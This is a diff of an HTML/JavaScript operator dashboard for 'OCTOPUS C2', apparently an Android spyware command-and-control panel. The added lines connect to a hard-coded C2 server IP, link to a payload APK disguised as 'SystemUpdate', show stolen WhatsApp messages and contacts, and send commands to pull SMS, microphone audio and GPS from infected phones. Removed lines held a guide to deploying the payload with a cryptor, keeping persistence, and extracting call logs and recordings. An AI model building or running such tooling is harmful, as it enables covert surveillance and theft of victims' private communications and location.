@@ -2,97 +2,31 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>OCTOPUS | COMMAND CENTER</title>
     <script src="https://cdn.socket.io/4.6.1/socket.io.min.js"></script>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;500;700&family=Syncopate:wght@700&display=swap');
-
-        :root {
-            --red: #ff1a1a;
-            --bg: #000;
-            --panel: #080808;
-            --border: #1a1a1a;
-            --glow: rgba(255, 26, 26, 0.4);
-        }
-
-        body {
-            margin: 0; background: var(--bg); color: #fff;
-            font-family: 'Space Grotesk', sans-serif; display: flex;
-            height: 100vh; overflow: hidden;
-        }
-
-        /* --- LOGIN OVERLAY --- */
-        #login-overlay {
-            position: fixed; inset: 0; background: #000; z-index: 9999;
-            display: flex; justify-content: center; align-items: center;
-        }
-        .login-card {
-            width: 100%; max-width: 380px; padding: 40px;
-            background: #050505; border: 1px solid var(--border);
-            border-radius: 40px; text-align: center;
-            box-shadow: 0 0 50px rgba(0,0,0,1);
-        }
-        .login-card h1 { font-family: 'Syncopate'; font-size: 18px; color: var(--red); letter-spacing: 5px; margin-bottom: 30px; }
-        input {
-            width: 100%; background: #000; border: 1px solid #111; padding: 15px;
-            border-radius: 15px; color: #fff; margin-bottom: 20px; outline: none; box-sizing: border-box;
-        }
-        input:focus { border-color: var(--red); box-shadow: 0 0 15px var(--glow); }
-        .login-btn {
-            width: 100%; padding: 15px; border-radius: 30px; border: none;
-            background: #fff; color: #000; font-family: 'Syncopate'; font-size: 10px;
-            cursor: pointer; transition: 0.3s;
-        }
+        :root { --red: #ff1a1a; --bg: #000; --panel: #080808; --border: #1a1a1a; }
+        body { margin: 0; background: var(--bg); color: #fff; font-family: 'Space Grotesk', sans-serif; display: flex; height: 100vh; overflow: hidden; }
+        
+        /* Sidebar & Overlay Styles */
+        #login-overlay { position: fixed; inset: 0; background: #000; z-index: 9999; display: flex; justify-content: center; align-items: center; }
+        .login-card { width: 100%; max-width: 380px; padding: 40px; background: #050505; border: 1px solid var(--border); border-radius: 40px; text-align: center; }
+        input { width: 100%; background: #000; border: 1px solid #111; padding: 15px; border-radius: 15px; color: #fff; margin-bottom: 20px; outline: none; box-sizing: border-box; }
+        .login-btn { width: 100%; padding: 15px; border-radius: 30px; border: none; background: #fff; color: #000; font-family: 'Syncopate'; font-size: 10px; cursor: pointer; transition: 0.3s; }
         .login-btn:hover { background: var(--red); color: #fff; }
 
-        /* --- SIDEBAR --- */
-        nav {
-            width: 280px; background: var(--panel); border-right: 1px solid var(--border);
-            display: flex; flex-direction: column; padding: 30px 0;
-        }
-        .brand-logo { text-align: center; margin-bottom: 40px; }
-        .brand-logo img { width: 80px; filter: drop-shadow(0 0 10px var(--red)); }
-        .nav-link {
-            padding: 18px 35px; color: #555; text-decoration: none; font-size: 12px;
-            text-transform: uppercase; letter-spacing: 2px; transition: 0.3s;
-            border-left: 3px solid transparent; cursor: pointer;
-        }
-        .nav-link.active, .nav-link:hover { color: #fff; background: rgba(255,0,0,0.03); border-left: 3px solid var(--red); }
+        nav { width: 280px; background: var(--panel); border-right: 1px solid var(--border); display: flex; flex-direction: column; padding: 30px 0; }
+        .nav-link { padding: 18px 35px; color: #555; text-decoration: none; font-size: 12px; text-transform: uppercase; letter-spacing: 2px; border-left: 3px solid transparent; cursor: pointer; }
+        .nav-link.active { color: #fff; border-left: 3px solid var(--red); }
 
-        /* --- MASTERMIND BIO --- */
-        .mastermind-section {
-            margin-top: auto; padding: 25px; border-top: 1px solid #111; background: #030303;
-        }
-        .mm-header { font-size: 10px; color: var(--red); letter-spacing: 3px; font-weight: 700; margin-bottom: 10px; }
-        .mm-bio { font-size: 12px; color: #888; line-height: 1.6; }
-        .mm-bio b { color: #fff; }
-
-        /* --- MAIN CONTENT --- */
         main { flex: 1; padding: 40px; overflow-y: auto; background: radial-gradient(circle at top right, #1a0000, #000); }
-        header { display: flex; justify-content: space-between; border-bottom: 1px solid #222; padding-bottom: 20px; margin-bottom: 30px; }
-        
-        /* --- HELP & TERMS SECTION --- */
-        .info-panel {
-            background: rgba(10, 10, 10, 0.8); border: 1px solid #222;
-            border-radius: 20px; padding: 30px; margin-top: 40px;
-        }
-        .info-panel h3 { color: var(--red); font-family: 'Syncopate'; font-size: 14px; margin-top: 0; }
-        .info-text { font-size: 13px; color: #666; line-height: 1.8; }
-
-        /* --- TARGET CARDS --- */
-        #target-container { display: grid; grid-template-columns: repeat(auto-fill, minmax(350px, 1fr)); gap: 20px; }
-        .card {
-            background: #0a0a0a; border: 1px solid #1a1a1a; border-radius: 25px;
-            padding: 25px; transition: 0.4s;
-        }
-        .card:hover { border-color: var(--red); transform: translateY(-5px); }
+        #target-container { display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 20px; }
+        .card { background: #0a0a0a; border: 1px solid #1a1a1a; border-radius: 25px; padding: 25px; transition: 0.4s; }
         .cmd-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-top: 20px; }
-        .cmd-btn {
-            background: #111; border: 1px solid #222; color: #fff; padding: 10px;
-            border-radius: 10px; font-size: 9px; font-weight: 700; cursor: pointer; transition: 0.2s;
-        }
+        .cmd-btn { background: #111; border: 1px solid #222; color: #fff; padding: 10px; border-radius: 10px; font-size: 9px; cursor: pointer; }
         .cmd-btn:hover { background: var(--red); }
+        .intel-log { background: rgba(255,255,255,0.03); border-left: 2px solid var(--red); padding: 10px; margin-bottom: 10px; font-size: 12px; }
     </style>
 </head>
 <body>
@@ -100,85 +34,60 @@
     <div id="login-overlay">
         <div class="login-card">
             <h1>OCTOPUS C2</h1>
-            <input type="text" id="user" placeholder="OPERATOR ID">
             <input type="password" id="pass" placeholder="MASTER KEY">
             <button class="login-btn" onclick="login()">INITIALIZE SESSION</button>
-            <p style="font-size: 9px; color: #333; margin-top: 20px;">18-YEAR-OLD SECURITY RESEARCHER INTERFACE</p>
         </div>
     </div>
 
     <nav id="sidebar" style="display:none;">
-        <div class="brand-logo">
-            <div style="font-family:'Syncopate'; color:var(--red); font-size: 20px;">OCTOPUS</div>
-        </div>
+        <div style="text-align: center; margin-bottom: 40px; font-family:'Syncopate'; color:var(--red); font-size: 20px;">OCTOPUS</div>
         <div class="nav-link active">Live Targets</div>
-        <div class="nav-link">SMS Logs</div>
-        <div class="nav-link">GPS Tracking</div>
-        <div class="nav-link">Build APK</div>
-        
-        <div class="mastermind-section">
-            <div class="mm-header">MASTERMIND</div>
-            <div class="mm-bio">
-                <b>Octopus // 18-Year-Old Researcher</b><br>
-                "While your pathetic education system tries to rot your brain with outdated shits, I build elite logic."<br>
-                <span style="color:var(--red); font-size: 10px; margin-top: 10px; display: block;">@octopus_xx1 // ILLEGAL CODE</span>
-            </div>
-        </div>
+        <a href="http://51.68.234.157:20211/download/SystemUpdate.apk" class="nav-link" style="color:var(--red)">Build/Download APK</a>
     </nav>
 
     <main id="main-content" style="display:none;">
-        <header>
+        <header style="display: flex; justify-content: space-between; border-bottom: 1px solid #222; padding-bottom: 20px; margin-bottom: 30px;">
             <h1 style="font-family: 'Syncopate'; font-size: 18px;">COMMAND CENTER</h1>
-            <div id="status" style="font-size: 10px; color: #444;">LINKING TO KATA BUMP...</div>
+            <div id="status" style="font-size: 10px; color: #444;">LINKING...</div>
         </header>
 
-        <div id="target-container">
-            <div id="no-targets" style="color: #222; letter-spacing: 2px;">WAITING FOR TARGET INFILTRATION...</div>
-        </div>
-
-        <div class="info-panel">
-            <h3>GUIDE & PROTOCOL</h3>
-            <div class="info-text">
-                <b>1. DEPLOYMENT:</b> Use the "Build APK" section (Logic integrated in Server) to generate your payload. Use a cryptor for maximum stealth.<br>
-                <b>2. PERSISTENCE:</b> Once connected, the target will heartbeat every 30 seconds. Battery optimization must be disabled on the target for 24/7 access.<br>
-                <b>3. DATA EXTRACTION:</b> Use the command grid on each target card to pull real-time SMS, Call Logs, or Mic recordings.
-            </div>
-            
-            <h3 style="margin-top: 30px;">TERMS & CONDITIONS</h3>
-            <div class="info-text">
-                This interface is designed for <b>Educational Research and Penetration Testing</b>. Unauthorized use on devices you do not own is strictly prohibited. The developer (Octopus) is not responsible for any misuse, data loss, or legal actions resulting from the operation of this software. By logging in, you agree to operate within the legal boundaries of your jurisdiction.
-            </div>
-        </div>
+        <div id="target-container"></div>
     </main>
 
     <script>
+        let socket;
         function login() {
-            const u = document.getElementById('user').value;
-            const p = document.getElementById('pass').value;
-            if(p === "octopus_xx1") {
+            if(document.getElementById('pass').value === "octopus_xx1") {
                 document.getElementById('login-overlay').style.display = 'none';
                 document.getElementById('sidebar').style.display = 'flex';
                 document.getElementById('main-content').style.display = 'block';
                 startC2();
-            } else {
-                alert("ACCESS DENIED");
-            }
+            } else { alert("ACCESS DENIED"); }
         }
 
         function startC2() {
-            const socket = io("http://51.68.234.157:20211", {
-                query: { type: 'mastermind', username: 'admin', key: 'octopus_xx1' }
+            socket = io("http://51.68.234.157:20211", {
+                query: { type: 'mastermind', key: 'octopus_xx1' }
             });
 
             socket.on('connect', () => {
-                document.getElementById('status').innerText = "CORE ONLINE: 51.68.234.157";
+                document.getElementById('status').innerText = "CORE ONLINE";
                 document.getElementById('status').style.color = "#0f0";
             });
 
             socket.on('update_dashboard', (res) => {
-                if(document.getElementById('no-targets')) document.getElementById('no-targets').remove();
-                
                 let grid = document.getElementById('target-container');
+                
+                // If it's WhatsApp Data, show a log entry
+                if (res.data.type === 'wa_message' || res.data.type === 'wa_contact') {
+                    const log = document.createElement('div');
+                    log.className = 'intel-log';
+                    log.innerHTML = `<b>[WA INTEL]</b> ${res.data.msg || res.data.name}`;
+                    grid.prepend(log);
+                    return;
+                }
+
+                // Otherwise, create/update Target Card
                 let card = document.getElementById(res.id);
                 if(!card) {
                     card = document.createElement('div');
@@ -186,23 +95,20 @@
                     card.className = 'card';
                     grid.appendChild(card);
                 }
-
                 card.innerHTML = `
-                    <div style="font-size: 9px; color: #0f0;">● ONLINE</div>
-                    <div style="font-size: 20px; font-weight:700; margin: 10px 0;">${res.data.model}</div>
-                    <div style="font-size: 11px; color:#666;">ID: ${res.id} | BAT: ${res.data.battery}%</div>
+                    <div style="font-size: 9px; color: #0f0;">● ONLINE | ${res.id}</div>
+                    <div style="font-size: 18px; font-weight:700; margin: 10px 0;">${res.data.model || 'Android Target'}</div>
                     <div class="cmd-grid">
                         <button class="cmd-btn" onclick="send('${res.id}', 'sms')">SMS</button>
                         <button class="cmd-btn" onclick="send('${res.id}', 'mic')">MIC</button>
                         <button class="cmd-btn" onclick="send('${res.id}', 'gps')">GPS</button>
-                    </div>
-                `;
+                    </div>`;
             });
         }
 
         function send(id, act) {
-            console.log("Sending " + act + " to " + id);
-            // Socket emit logic here
+            socket.emit('run_action', { targetId: id, action: act });
+            console.log("Action Sent: " + act);
         }
     </script>
 </body>
